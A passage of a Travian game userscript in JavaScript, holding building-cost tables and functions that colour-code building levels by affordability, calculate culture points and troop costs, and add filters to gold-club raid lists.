[930,890,930,320,1,3],
[1240,1185,1240,425,2,4],
[1645,1575,1645,565,2,5],
[2190,2095,2190,750,2,6],
[2915,2790,2915,1000,3,8],
[3875,3710,3875,1330,4,10],
[5155,4930,5155,1765,4,12],
[6855,6560,6855,2350,5,14],
[9115,8725,9115,3125,6,16],//10
[12125,11605,12125,4155,7,18],
[16125,15435,16125,5530,9,20],
[21445,20525,21445,7350,11,22],
[28520,27300,28520,9780,13,24],
[37935,36310,37935,13005,15,24],
[50450,48290,50450,17300,18,27],
[67100,64225,67100,23005,22,30],
[89245,85420,89245,30600,27,33],
[118695,113605,118695,40695,32,36],
[157865,151095,157865,54125,37,39]//20
],
[//greatWarehouseCost gid = 38
[0,0,0,0,0,0,0],
[650,800,450,200,1,1],
[830,1025,575,255,1,2],
[1065,1310,735,330,2,3],
[1365,1680,945,420,2,4],
[1745,2145,1210,535,2,5],
[2235,2750,1545,685,3,6],
[2860,3520,1980,880,4,7],
[3660,4505,2535,1125,4,8],
[4685,5765,3245,1440,5,9],
[5995,7380,4150,1845,6,10],//10
[7675,9445,5315,2360,7,12],
[9825,12090,6800,3020,9,14],
[12575,15475,8705,3870,11,16],
[16095,19805,11140,4950,13,18],
[20600,25355,14260,6340,15,20],
[26365,32450,18255,8115,18,22],
[33750,41540,23365,10385,22,24],
[43200,53170,29910,13290,27,26],
[55295,68055,38280,17015,32,28],
[70780,87110,49000,21780,38,30]//20
],
[//greatGranaryCost gid = 39
[0,0,0,0,0,0],
[400,500,350,100,1],
[510,640,450,130,1,2],
[655,820,575,165,2,3],
[840,1050,735,210,2,4],
[1075,1340,940,270,2,5],
[1375,1720,1205,345,3,6],
[1760,2200,1540,440,4,7],
[2250,2815,1970,565,4,8],
[2880,3605,2520,720,5,9],
[3690,4610,3230,920,6,10],//10
[4720,5905,4130,1180,7,12],
[6045,7555,5290,1510,9,14],
[7735,9670,6770,1935,11,16],
[9905,12380,8665,2475,13,18],
[12675,15845,11090,3170,15,20],
[16225,20280,14200,4055,18,22],
[20770,25960,18175,5190,22,24],
[26585,33230,23260,6645,27,26],
[34030,42535,29775,8505,32,28],
[43555,54445,38110,10890,38,30]//20
],
[//WWCost gid = 40
[0,0,0,0,0,0],
[66700,69050,72200,13200,0,1],
[68535,70950,74185,13565,0,2],
[70420,72900,76225,13935,0,3],
[72355,74905,78320,14320,0,4],
[74345,76965,80475,14715,0,5],
[76390,79080,82690,15120,0,6],
[78490,81255,84965,15535,0,7],
[80650,83490,87300,15960,0,8],
[82865,85785,89700,16400,0,9],
[85145,88145,92165,16850,0,10],//10
[87485,90570,94700,17315,0,12],
[89895,93060,97305,17790,0,14],
[92365,95620,99980,18280,0,16],
[94905,98250,102730,18780,0,18],
[97515,100950,105555,19300,0,20],
[100195,103725,108460,19830,0,22],
[102950,106580,111440,20375,0,24],
[105785,109510,114505,20935,0,26],
[108690,112520,117655,21510,0,28],
[111680,115615,120890,22100,0,30],//20
[114755,118795,124215,22710,0,33],
[117910,122060,127630,23335,0,36],
[121150,125420,131140,23975,0,39],
[124480,128870,134745,24635,0,42],
[127905,132410,138455,25315,0,45],
[131425,136055,142260,26010,0,48],
[135035,139795,146170,26725,0,51],
[138750,143640,150190,27460,0,54],
[142565,147590,154320,28215,0,57],
[146485,151650,158565,28990,0,60],//30
[150515,155820,162925,29785,0,64],
[154655,160105,167405,30605,0,68],
[158910,164505,172010,31450,0,72],
[163275,169030,176740,32315,0,76],
[167770,173680,181600,33200,0,80],
[172380,178455,186595,34115,0,84],
[177120,183360,191725,35055,0,88],
[181995,188405,197000,36015,0,92],
[186995,193585,202415,37005,0,96],
[192140,198910,207985,38025,0,100],//40
[197425,204380,213705,39070,0,105],
[202855,210000,219580,40145,0,110],
[208430,215775,225620,41250,0,115],
[214165,221710,231825,42385,0,120],
[220055,227805,238200,43550,0,125],
[226105,234070,244750,44745,0,130],
[232320,240505,251480,45975,0,135],
[238710,247120,258395,47240,0,140],
[245275,253915,265500,48540,0,145],
[252020,260900,272800,49875,0,150],//50
[258950,268075,280305,51245,0,156],
[266070,275445,288010,52655,0,162],
[273390,283020,295930,54105,0,168],
[280905,290805,304070,55590,0,174],
[288630,298800,312430,57120,0,180],
[296570,307020,321025,58690,0,186],
[304725,315460,329850,60305,0,192],
[313105,324135,338925,61965,0,198],
[321715,333050,348245,63670,0,204],
[330565,342210,357820,65420,0,210],//60
[339655,351620,367660,67220,0,217],
[348995,361290,377770,69065,0,224],
[358590,371225,388160,70965,0,231],
[368450,381435,398835,72915,0,238],
[378585,391925,409800,74920,0,245],
[388995,402700,421070,76985,0,252],
[399695,413775,432650,79100,0,259],
[410685,425155,444550,81275,0,266],
[421980,436845,456775,83510,0,273],
[433585,448860,469335,85805,0,280],//70
[445505,461205,482240,88165,0,288],
[457760,473885,495505,90590,0,296],
[470345,486920,509130,93080,0,304],
[483280,500310,523130,95640,0,312],
[496570,514065,537520,98270,0,320],
[510225,528205,552300,100975,0,328],
[524260,542730,567490,103750,0,336],
[538675,557655,583095,106605,0,344],
[553490,572990,599130,109535,0,352],
[568710,588745,615605,112550,0,360],//80
[584350,604935,632535,115645,0,369],
[600420,621575,649930,118825,0,378],
[616930,638665,667800,122090,0,387],
[633895,656230,686165,125450,0,396],
[651330,674275,705035,128900,0,405],
[669240,692820,724425,132445,0,414],
[687645,711870,744345,136085,0,423],
[706555,731445,764815,139830,0,432],
[725985,751560,785850,143675,0,441],
[745950,772230,807460,147625,0,450],//90
[766460,793465,829665,151685,0,460],
[787540,815285,852480,155855,0,470],
[809195,837705,875920,160140,0,480],
[831450,860745,900010,164545,0,490],
[854315,884415,924760,169070,0,500],
[877810,908735,950190,173720,0,510],
[901950,933725,976320,178495,0,520],
[926750,959405,1000000,183405,0,530],
[952235,985785,1000000,188450,0,540],
[1000000,1000000,1000000,193630,0,550]//100
],
[//horsedtCost gid = 41
[0,0,0,0,0,0],
[780,420,660,540,4,5],
[1000,540,845,690,4,8],
[1280,690,1080,885,5,11],
[1635,880,1385,1130,6,14],
[2095,1125,1770,1450,7,17],
[2680,1445,2270,1855,9,20],
[3430,1845,2905,2375,11,23],
[4390,2365,3715,3040,13,26],
[5620,3025,4755,3890,15,29],
[7195,3875,6085,4980,19,31],//10
[9210,4960,7790,6375,22,35],
[11785,6345,9975,8160,27,39],
[15085,8125,12765,10445,32,43],
[19310,10400,16340,13370,39,47],
[24720,13310,20915,17115,46,51],
[31640,17035,26775,21905,55,55],
[40500,21810,34270,28040,67,59],
[51840,27915,43865,35890,80,63],
[66355,35730,56145,45940,96,67],
[84935,45735,71870,58800,115,71]//20
]
];

fieldsOfVillage = {
	'f1':	[3, 3, 0, 3, 3, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1], //9 crop
	'f2':	[2, 3, 0, 2, 1, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1], //3-4-5-6
	'f3':	[0, 3, 0, 2, 1, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1], //4-4-4-6
	'f4':	[0, 3, 0, 1, 1, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1], //4-5-3-6
	'f5':	[0, 3, 0, 2, 0, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1], //5-3-4-6
	'f6':	[3, 3, 0, 2, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 1, 3, 3], //15 crop
	'f7':	[0, 3, 3, 0, 1, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1], //4-4-3-7
	'f8':	[2, 3, 3, 0, 1, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1], //3-4-4-7
	'f9':	[2, 3, 3, 0, 0, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1], //4-3-4-7
	'f10':	[2, 3, 0, 1, 1, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1], //3-5-4-6
	'f11':	[2, 0, 0, 2, 0, 3, 3, 2, 2, 1, 1, 2, 0, 3, 3, 1, 3, 3], //4-3-5-6
	'f12':	[0, 3, 0, 0, 1, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1]  //5-4-3-6
};
//		'f99':	'Natarian village',

// ›› Main.
function TM_ShowMainBuildingNumbers(){

	var gid;
	var countArray, checkWW=false;
	var mapOffset = 1;
	// ›› Map1 holds building names, level and building spot IDs in area elements (2 are duplicate walls to be ignored).

	// active buildings
	var bldText = $xf('//script[contains(text(),"bld=")]');
	var bldArr = new Array(41);
	if( bldText ) {
		eval(bldText.innerHTML);
		for( var i=0; i<bld.length; i++ ) bldArr[bld[i]['aid']] = bld[i]['stufe'];
	}

	var mapInfo = ver4FL ? $g('clickareas'): $g('map2');
	if ( mapInfo ) {
		countArray = 22;
		dorf = 2;
		mapOffset = 19;
		var levels = $gt('DIV',$g('levels'));
		var lRef = 0;
	} else {
		mapInfo = $g('rx');
		if ( mapInfo ) {
			countArray = 18;
			dorf = 1;
			if( ver4FL ) var levels = $gt('DIV',$g('village_map'));
			else { var dtop = 68; var dleft = ltr ? 3: 225; }
		}
	}

	if( !(mapInfo) ) return;

	var areaElements = $gt('area', mapInfo);
	var imageElements =  $gt('img',$g('village_map'));
	var BuildingLevel, smallDIV, coords;

	if (dorf == 2) {
		if( countArray > imageElements.length-1 ) {
			checkWW = true;
			countArray = areaElements.length;
		}
		if( ver4FL ) {
			// tables for T4 from Qusai Abu Hilal قصي أبو هلال
			bCost[13] = [//smithy (T4) gid = 13
				[0,0,0,0,0,0],
				[180,250,500,160,2,4],  //to lvl 1: 180 250 500 160 4 OK
				[230,320,640,205,3,6],  //to lvl 2: 230 320 640 205 2 OK
				[295,410,820,260,3,8],  //to lvl 3: 295 410 820 260 2 OK
				[375,525,1050,335,4,10],//to lvl 4: 375 525 1050 335 2 OK
				[485,670,1340,430,5,12],//to lvl 5: 485 670 1340 430 2 OK
				[620,860,1720,550,6,15],//to lvl 6: 620 860 1720 550 3 OK
				[790,1100,2200,705,7,18],   //to lvl 07: // 790 1100 2200 705 3
				[1015,1405,2815,900,9,21],  //to lvl 08: // 1015 1405 2815 900 3
				[1295,1800,3605,1155,10,24],//to lvl 09: 1295 1800 3605 1155 3 OK
				[1660,2305,4610,1475,12,27],//to lvl 10: // 1660 2305 4610 1475 3 OK
				[2125,2950,5905,1890,15,30],//to lvl 11: // 2125 2950 5905 1890 3 OK
				[2720,3780,7555,2420,18,33],//to lvl 12: // 2720 3780 7555 2420 3
				[3480,4835,9670,3095,21,36],//to lvl 13: // 3480 4835 9670 3095 3 OK
				[4455,6190,12380,3960,26,39], //to lvl 14: // 4455 6190 12380 3960 3 OK
				[5705,7925,15845,5070,31,42], //to lvl 15: // 5705 7925 15845 5070 3 OK
				[7300,10140,20280,6490,37,46],//to lvl 16: // 7300 10140 20280 6490 4 OK
				[9345,12980,25960,8310,44,50],//to lvl 17: // 9345 12980 25960 8310 4 OK
				[11965,16615,33230,10635,53,54],//to lvl 18: // 11965 16615 33230 10635 4 OK
				[15315,21270,42535,13610,64,58], //to lvl 19: //  15315 21270 42535 13610 OK
				[19600,27225,54445,17420,77,62]  //to lvl 20: //  19600 27225 54445 17420 4
			];
			bCost[36] = [//trapperCost gid = 36
				[0,0,0,0,0,0],
				[80,120,70,90,1,4],    // To lvl 1: OK
				[100,155,90,115,1,6],  // To lvl 2: OK
				[130,195,115,145,2,8], // To lvl 3: OK
				[170,250,145,190,2,10],// To lvl 4: OK
				[215,320,190,240,2,12],// To lvl 5: OK
				[275,410,240,310,3,15],// To lvl 6: OK
				[350,530,310,395,4,18],// To lvl 7: OK
				[450,675,395,505,4,21],// To lvl 8: OK
				[575,865,505,650,5,24],// To lvl 9: OK
				[740,1105,645,830,6,27],    // To lvl 10: OK
				[945,1415,825,1065,7,30], // To lvl 11: OK
				[1210,1815,1060,1360,9,33], // To lvl 12: OK
				[1545,2320,1355,1740,11,36],// To lvl 13: OK
				[1980,2970,1735,2230,13,39],// To lvl 14: OK
				[2535,3805,2220,2850,15,42],// To lvl 15: OK
				[3245,4870,2840,3650,18,46],// To lvl 16: OK
				[4155,6230,3635,4675,22,50],// To lvl 17: OK
				[5315,7975,4650,5980,27,54],// To lvl 18: OK
				[6805,10210,5955,7655,32,58],// To lvl 19: OK
				[8710,13065,7620,9800,38,62] // To lvl 20: OK
			];
		}
	}

	for (var i = 0; i < countArray; i++) {
		BuildingLevel = /\d+/.exec(areaElements[i].alt);
		if (! BuildingLevel) BuildingLevel = /\d+/.exec(areaElements[i].title);
		if (! BuildingLevel) continue;

		if (dorf == 2) {
			gid = parseInt(/(\d+)\S*$/.exec(imageElements[i].getAttribute('class'))[1]);
			if( checkWW ) {
				if( ver4FL && i == 6 ) gid = 40;
				if( ! ver4FL && i == 8 ) gid = 40;
			}
			smallDIV = levels[lRef++];
			if( ! ver4FL && /map/i.test(imageElements[i].getAttribute('class')) )
				gid = 31 + parseInt(RB.Setup[2]);
		}
		if (dorf == 1){
			var typeOfVillage = $g('village_map').getAttribute('class');
			gid = fieldsOfVillage[typeOfVillage][i]+1;
			smallDIV = ver4FL ? levels[i]: $g('rx').appendChild($ee('div',BuildingLevel[0],[['class',allIDs[42]]]));
		}

		if( ! ver4FL && dorf == 1 ) {
			coords = areaElements[i].coords.split(',');
			smallDIV.style.top = parseInt(coords[1]) + dtop +'px';
			smallDIV.style.left = parseInt(coords[0]) + dleft +'px';
			smallDIV.style.visibility = "visible";
		} else smallDIV.className += ' '+allIDs[42];
		if( bldArr[i+mapOffset] ) {
			if( khtmlFL ) {
				var y=0;
				setInterval(function(x){return function(){
					if(y>0){x.style.color='white';y=0;}else{x.style.color='black';y=1;}}
				}(smallDIV),1000);
			} else smallDIV.style.textDecoration = 'blink';
			BuildingLevel[0] = bldArr[i+mapOffset];
		}

		try {
			var resneed = bCost[gid][parseInt(BuildingLevel[0])+1];
		} catch (err) {
//			alert( gid +' /// '+ BuildingLevel +' /// '+ getMaxLevel(gid));
			continue;
		}

		if (parseInt(BuildingLevel[0]) == getMaxLevel(gid)) {
			smallDIV.style.backgroundColor = getColor(4);//green
		}else if( resneed[0] > fullRes[0] || resneed[1] > fullRes[0] || resneed[2] > fullRes[0] || resneed[3] > fullRes[3] ) {
			smallDIV.style.backgroundColor = getColor(3);//magenta
		}else if( (resNow[0]+resNow[1]+resNow[2]+resNow[3]) >= (resneed[0]+resneed[1]+resneed[2]+resneed[3]) ){
			if(resNow[0] >= resneed[0] && resNow[1] >= resneed[1] && resNow[2] >= resneed[2] && resNow[3] >= resneed[3]){
				smallDIV.style.backgroundColor = getColor(0);//white
			}else{
				smallDIV.style.backgroundColor = getColor(1);//orange #FFC85B
			}
		}else if (parseInt(resneed[0]) > resNow[0] ||
			parseInt(resneed[1]) > resNow[1] ||
			parseInt(resneed[2]) > resNow[2] ||
			parseInt(resneed[3]) > resNow[3] ){
			smallDIV.style.backgroundColor = getColor(2);//red
		}
	}
}

function getColor(x) {
	return RB.Setup[40+x].length>1 ? RB.Setup[40+x]: cnColors[x];
}

function getMaxLevel(gid) {
	var maxLevel;
	switch (gid) {
		case 1:
		case 2:
		case 3:
		case 4: if( village_aid == RB.dictionary[0] ) maxLevel = RB.dictFL[17]==1 ? 12: 25;
				else maxLevel = 10;
			break;
		case 5:
		case 6:
		case 7:
		case 8:
		case 9:
			maxLevel = 5;
			break;
		case 23:
		case 35:
			maxLevel = 10;
			break;
		case 40:
			maxLevel = 100;
			break;
		default:
			maxLevel = 20;
	}
	return (maxLevel)
}

function cultureCalc () {
	var blevel = $gc('level',$gt('h1',cont)[0]);
	if( blevel.length == 0 ) return;
	var contr = $g('contract');
	if( ! contr ) return;
	if( $gt('INPUT',contr).length > 0 ) return;
	blevel = parseInt(blevel[0].innerHTML.match(/\d+/)[0]);
	var bid = parseInt($g('build').getAttribute('class').match(/\d+/)[0]);
	var clocks = ver4FL ? $gc('clocks',contr): $gc('clock',contr);
	if( clocks.length > 0 ) {
		var cB = $em('SPAN',[' ',$e('IMG',[['src',img_cp],['title',RB.dictionary[19]]]),' '+bCost[bid][blevel][4]+' -> '+bCost[bid][blevel+1][4]+' ',$e('IMG',[['src','img/x.gif'],['class','r5'],['title',RB.dictionary[20]]]),' '+bCost[bid][blevel][5]+' -> '+bCost[bid][blevel+1][5]],[['style','white-space:nowrap;']]);
		if( ver4FL ) {
			var cl = $gc('clear',contr);
			$ib(cB,cl[cl.length-1]);
		} else contr.appendChild(cB);
	} else {
		var cB = $em('SPAN',[' ',$e('IMG',[['src',img_cp],['title',RB.dictionary[19]]]),' '+bCost[bid][blevel][4]+' ',$e('IMG',[['src','img/x.gif'],['class','r5'],['title',RB.dictionary[20]]]),' '+bCost[bid][blevel][5]]);
		contr.appendChild(cB);
	}
}

TM_ShowMainBuildingNumbers();
if( /build/.test(window.location.href) ) cultureCalc();
}
/****************************** end Center Number ****************************/

function allyQStats () {
	var members = $g('member');
	if( ! members ) return;
	var t4 = true;
	if( members.rows[0].cells.length > 3 ) t4 = false;
	if( t4 ) members.rows[0].cells[0].setAttribute("colspan","2");
	var sumC = 0, sumV = 0;
	for( var i=1; i<members.rows.length; i++ ) {
		if( t4 ) $ib($c(i),members.rows[i].cells[0]);
		sumC += parseInt( members.rows[i].cells[2].innerHTML );
		sumV += parseInt( members.rows[i].cells[3].innerHTML );
	}
	i--;
	var blue = $xf('.//img[contains(@class,"online1")]','l',cont);
	var semafor = $c('&nbsp;');
	if( blue.snapshotLength > 0 ) {
		semafor.appendChild($em('SPAN',[blue.snapshotItem(0).cloneNode(true),' = ',blue.snapshotLength]));
		for( var t=2; t<6; t++ ) {
			var blue = $xf('.//img[contains(@class,"online'+t+'")]','l',cont);
			if( blue.snapshotLength > 0 )
				semafor.appendChild($em('SPAN',[' ; ',blue.snapshotItem(0).cloneNode(true),' = ',blue.snapshotLength]));
			}
		}
	var newT = $em('TR',[$c(semafor,[['colspan',2]]),$c(sumC+' / '+i+' = '+Math.round(sumC/i),[['style','text-align:'+docDir[1]+';']]),$c(sumV+' / '+i+' = '+Math.round(sumV/i),[['style','text-align:'+docDir[1]+';']])]);
	if( members.rows[1].cells.length > 4 ) newT.appendChild($c('&nbsp;',[['colspan',members.rows[1].cells.length-4]]));
	members.appendChild($ee('TBODY',newT));
}

function calcTroopCost () {
	function resRecalc () {
		allWR = [0,0,0,0,0,0];
		var nc = 0;
		for( var i=0; i < wRes.length; i++ ) {
			nc = parseInt(wRes[i][0].value).NaN0();
			for( var t=0; t<6; t++ ) allWR[t] += wRes[i][t+2] * nc;
		}
		var wantD = '>'+allWR[1]+' >'+allWR[2]+' >'+allWR[3]+' >'+allWR[4];

		var newBTX = $ee('BUTTON',gtext("close")+' (X)',[['onClick',jsNone],['class',allIDs[15]],['style','direction:ltr']]);
		newBTX.addEventListener('click', closeTip, true);

		var nts = tshift>0 ? tshift + (RunTime[0] - (new Date().getTime())) / 1e3: 0;
		var newR = $em('TR',[$em('TD',[trImg('clock'),' ',$eT('SPAN',allWR[0]+nts,0),' ',trImg('r5'),' ',allWR[5]]),$c(newBTX)]);
		var newTbl = $ee('TABLE',newR,[['class',allIDs[7]],['style','background-color:#FAFAFF;']]);
		var newT = needed_show( wantD );
		newR = $ee('TR',$c(newT,[['colspan',2]]));
		newTbl.appendChild(newR);
		closeWindowN(9);
		var xy = offsetPosition(this);
		windowID[9] = makeFloat(newTbl,xy[0]-(ltr?100:300),xy[1]-60);
	}
	function closeTip () {
		closeWindowN(9);
	}

	var inp = $gt('INPUT',cont);
	var t = 0;
	var wRes = [];
	for( var i=0; i < inp.length; i++ ) {
		var tinp = inp[i];
		var tname = tinp.getAttribute('name');
		var tarm = tname.match(/t(\d+)/);
		if( tarm ) tarm = tarm[1]; else continue;
		var base = ver4FL ? $gc('showCosts', tinp.parentNode)[0].innerHTML:
							$gc('details', tinp.parentNode.parentNode)[0].innerHTML;
		var nRes = base.match(/>(\d+).+?>(\d+).+?>(\d+).+?>(\d+).+?>(\d+)/);
		var nTime = toSeconds(base);
		wRes[t++] = [tinp,tname,nTime,parseInt(nRes[1]),parseInt(nRes[2]),parseInt(nRes[3]),parseInt(nRes[4]),parseInt(nRes[5])];
		tinp.addEventListener('keyup', resRecalc, false);
		tinp.addEventListener('click', resRecalc, false);
	}
	var tshift = 0;
	var upt = $xf('.//table[@class="under_progress"]','l',cont);
	if( upt.snapshotLength > 0 ) {
		upt = upt.snapshotItem(0);
		var ts = $xf('.//td[@class="dur"]/span','l',upt);
		tshift = toSeconds(ts.snapshotItem(ts.snapshotLength-1).innerHTML);
		var allUC = new Object();
		var mFL = false;
		var ts = $xf('.//td[@class="desc"]/img','l',upt);
		for( var i=0; i < ts.snapshotLength; i++ ) {
			var uclass = ts.snapshotItem(i).getAttribute('class');
			if( typeof(allUC[uclass]) == 'undefined' ) allUC[uclass] = ['',0,0];
			allUC[uclass][0] = ts.snapshotItem(i).getAttribute('alt');
			allUC[uclass][1] += parseInt(ts.snapshotItem(i).parentNode.innerHTML.onlyText().match(/\d+/)[0]);
			if( allUC[uclass][2] > 0 ) mFL = true; else allUC[uclass][2]++;
		}
		if( mFL ) {
			var ts = $xf('.//tbody','f',upt);
			for( var i in allUC )
				ts.appendChild($ee('TR',$em('TD',[trImg(allIDs[45]+' '+i,allUC[i][0]),' '+allUC[i][1]+' '+allUC[i][0]],[['colspan',3]])));
				//insertAfter($em('DIV',[trImg(allIDs[45]+' '+i,allUC[i][0]),' '+allUC[i][1]+' '+allUC[i][0]],[['style','margin:5px 10px;']]), upt);
		}
	}
}

function saveHeroSpeed () {
	var sb = $gc("speed tooltip",cont);
	if( sb.length > 0 ) {
		RB.dictFL[19] = sb[0].innerHTML.match(/>\s*?(\d+)/)[1];
		saveCookie( 'DictFL', 'dictFL' );
	}
}

function goldClubInfo () {
	function checkClass (clName,chkbox) {
		var ac = $xf('.//tr[.//img[contains(@class,"'+clName+'")]]','l',chkbox.parentNode.parentNode.parentNode);
		for( var t=0; t < ac.snapshotLength; t++ )
			var ad = $gt('INPUT',ac.snapshotItem(t))[0].checked=chkbox.checked;
	}
	function checkGreen () {
		checkClass('iReport1',this);
	}
	function checkUni (a) {
		checkClass(a[0],a[1]);
	}
	function checkAll () {
		var ai = $gt('INPUT',this.parentNode);
		for( var i=1; i<ai.length; i++ )
			ai[i].checked=this.checked;
	}
	function makeChkBox (fListID) {
		return $e('INPUT',[['type','checkbox'],['onClick','setTimeout(function(){'+allIDs[0]+'('+fListID+');},200)']]);
	}
	function oasisXY (farmList) {
		var oXY = $gc('coordinatesWrapper',farmList);
		for(var i=0; i<oXY.length; i++) {
			var xy = id2xy(getVidFromCoords(oXY[i].innerHTML));
			var newA = '<a href="position_details.php?x='+xy[0]+'&y='+xy[1]+'">'+oXY[i].innerHTML+'</a>';
			oXY[i].innerHTML = newA;
		}
		return i;
	}
	function uncheckOasis (nd) {
		try {
			$gc('markSlot',nd.parentNode.parentNode.parentNode.parentNode)[0].checked=false;
		} catch(e) {};
	}
	function findAnimA (x) {
		var vid = getVidFromCoords(x[0].innerHTML);
		var xy = id2xy(vid);
		ajaxRequest(fullName+'ajax.php?cmd=viewTileDetails', 'POST', 'cmd=viewTileDetails&x='+xy[0]+'&y='+xy[1], function(ajaxResp) {
			var mapData = eval('(' + ajaxResp.responseText + ')');
			var adv = $ee('DIV',mapData.data.html,[['style','display:none;']]);
			ad = $xf('.//table[@id="troop_info"]','f',adv);
			if( ad ) {
				chkOasisFL[x[1]][vid] = getTroopsInOasis(ad);
				if( ! chkOasisFL[x[1]][vid] ) {
					ad = $xf('.//table[@id="village_info"]','f',adv);
					if( ad ) chkOasisFL[x[1]][vid] = ad;
				}
				addToolTip(chkOasisFL[x[1]][vid],x[0].parentNode);
				if( chkOasisFL[x[1]][vid] )
					uncheckOasis(x[0]);
			}
			if( ! x[3] ) {
				x[2].removeAttribute('style');
				x[2].click();
			}
		}, dummy);
	}
	function findAnim (farmList,fListID,cb) {
		var ac = $gc('coordinatesWrapper',farmList.parentNode);
		var curTO = 0;
		for(var i=ac.length-1; i>=0; i--) {
			var vid = getVidFromCoords(ac[i].innerHTML);
			if( typeof(chkOasisFL[fListID][vid]) == 'undefined' ) {
				if( ! curTO ) cb.setAttribute('style','text-decoration:blink;color:red;');
				setTimeout(function(x) { return function() { findAnimA(x) }}([ac[i],fListID,cb,i]), curTO);
				curTO += getRandom(250,1000);
			} else {
				if( chkOasisFL[fListID][vid] ) {
					uncheckOasis(ac[i]);
					if( chkOasisFL[fListID].fl )
						addToolTip(chkOasisFL[fListID][vid],ac[i].parentNode);
				}
			}
		}
		chkOasisFL[fListID].fl = false;
	}
	function scanGoldRep () {
		function addARLFilter (sc,cl) {
			var ac = $xf('.//img[contains(@class,"'+sc+'")]','f',fList[i].parentNode);
			if( ac ) {
				var nca = makeChkBox(fListID);
				nca.addEventListener('click',function(i) { return function() { checkUni(i) }}([sc,nca]),false);
				$am(sp,[' | ',nca,' ',trImg(cl+' '+sc,ac.getAttribute('alt').split(':')[0])]);
			}
			fList[i].appendChild(sp);
		}
		var fList = $gc('markAll',cont);
		for( var i=0; i < fList.length; i++ ) {
			var fListID = $gt('INPUT',fList[i]);
			if( fListID.length != 1 ) continue;
			fListID = fListID[0].getAttribute('id').match(/\d+/)[0];

			$gt('INPUT',fList[i])[0].addEventListener('click',checkAll,false);
			var nc = makeChkBox(fListID);
			nc.addEventListener('click',checkGreen,false);
			var sp = $em('SPAN',[nc,' ',trImg('iReport iReport1',RB.dictRp[0])],[['style','padding:5px 0px;']]);
			addARLFilter('iReport3','iReport iReport3');
			addARLFilter('att','att2');
			addARLFilter('full','carry');
			addARLFilter('half','carry');

			if( oasisXY(fList[i].parentNode) ) {
				if( typeof(chkOasisFL[fListID]) == 'undefined'  )
					chkOasisFL[fListID] = new Object;
				chkOasisFL[fListID].fl = true;
				var anim = $em('BUTTON',[trImg('unit u31'),' ??? '],[['onClick','setTimeout(function(){'+allIDs[0]+'('+fListID+');},200);return false;']]);
				anim.addEventListener('click',function(x) { return function() { findAnim(x[0],x[1],x[2]) }}([fList[i],fListID,anim]),false);
				$am(sp,[' | ',anim]);
			}

			var allBer = $xf('.//a[contains(@href,"berichte.php?id=")]','l',fList[i].parentNode);
			for( var t=0; t < allBer.snapshotLength; t++ ) {
				var tImg = $gt('IMG',allBer.snapshotItem(t).parentNode);
				if( tImg.length > 1 )
					tImg[0].addEventListener('click', function(x) { return function() { selectMessage(x); }}([allBer.snapshotItem(t).getAttribute('href'),offsetPosition(tImg[0])]), true);
			}

			var flID = $gt('INPUT',fList[i])[0].getAttribute("onClick").match(/\d+/)[0];
			if( flID != RB.village_Var[2] ) {
				RB.village_Var[2] = flID;
				saveVCookie( 'VV', RB.village_Var );
				if( RB.dictFL[22] == 0 ) {
					try {
						var tm = $gc('tabItem',$gc('active',$gc(ver42FL?'subNavi':'tabNavi',cont)[0])[0])[0].innerHTML.onlyText().trim();
					} catch(err) {
						var tm = false;
					}
					if( tm ) {
						RB.dictionary[22] = tm;
						saveCookie( 'Dict', 'dictionary' );
						RB.dictFL[22] = 1;
						saveCookie( 'DictFL', 'dictFL' );
					}
				}
			}
		}
	}
	function selectMessage ( a ) {
		viewMessageIWDisplay( a[0], 1, a[1] );
	}

	var xy = RB_getValue(GMcookieID + 'next', -1);
	if( $gn('x').length < 1 ) {
		if( xy > 0 ) {
			if( RB.overview[1] == "gc" ) {
				RB.overview[1] = "";
				saveCookie('OV', 'overview');
				xy = id2xy( xy );
				document.location.href = 'karte.php?x='+xy[0]+'&y='+xy[1];
			}
		}
		dictRpInit();
		var chkOasisFL = new Object();
		setInterval(scanGoldRep, 1000);

		document.head.appendChild($ee('SCRIPT','function '+allIDs[0]+'(a){'+
		'$("list"+a).getElements(".markSlot").each(function(c){'+
			'Travian.Game.RaidList.data[a].slots[c.name.match(/\\d+/)[0]].marked=c.checked;'+
		'});Travian.Game.RaidList.updateTroopSummaryForAList(a);};',[['type',"text/javascript"]]));

	} else {
		if( xy > 0 ) {
			fillXY();
			RB.overview[1] = "gc";
			saveCookie('OV', 'overview');
		}
		var ss = $g('raidListSlot');
		if( ss ) {
			addShowDistanceIn( $g('save'), 0 );
			ss.addEventListener('keyup', a2bInfo, false);
			ss.addEventListener('click', a2bInfo, false);
		}
	}
}

function calcNPCtroops () {
	var allD = $gc('details',cont);
	for( var i=0; i<allD.length; i++ ) {
		var woodU = allD[i].innerHTML.match(/>\s*?(\d+)/)[1];
		var npcI = $gc('npc',allD[i]);
		if( npcI.length < 1 ) return;
		var woodN = allD[i].innerHTML.match(/r1=(\d+)&/)[1];
		npcI[0].parentNode.appendChild($ee('SPAN','('+(Math.floor(woodN/woodU))+')',[['style','padding:0px 5px;']]));
	}
}

function calcUnitUpgrade () {
	function showUnitUpgrade ( aN ) {
		var ITTb = $e('TBODY');
		var newITT = $ee('TABLE',ITTb,[['class',allIDs[7]]]);
		if( aN[1] > 0 ) ITTb.appendChild(trUC(aN[0],0));
		if( aN[1] > 1 ) ITTb.appendChild(trNull());
		var hlTR = trUC(aN[0],aN[1]);
		hlTR.firstChild.setAttribute('style','background-color:#FF8000;');
		ITTb.appendChild(hlTR);
		if( aN[1] < 19 ) ITTb.appendChild(trUC(aN[0],aN[1]+1));
		if( aN[1] < 18 ) ITTb.appendChild(trNull());
		if( aN[1] < 20 ) ITTb.appendChild(trUC(aN[0],20));
		var tHead = $ee('THEAD',$em('TR',[$c('#'),$c(trImg('att_all')),$c(trImg('def_i')),$c(trImg('def_c'))]));
		newITT.appendChild(tHead);
		makeTooltip(newITT);
	}
	function sUC (tt,c,ul) {
		if( ver4FL )
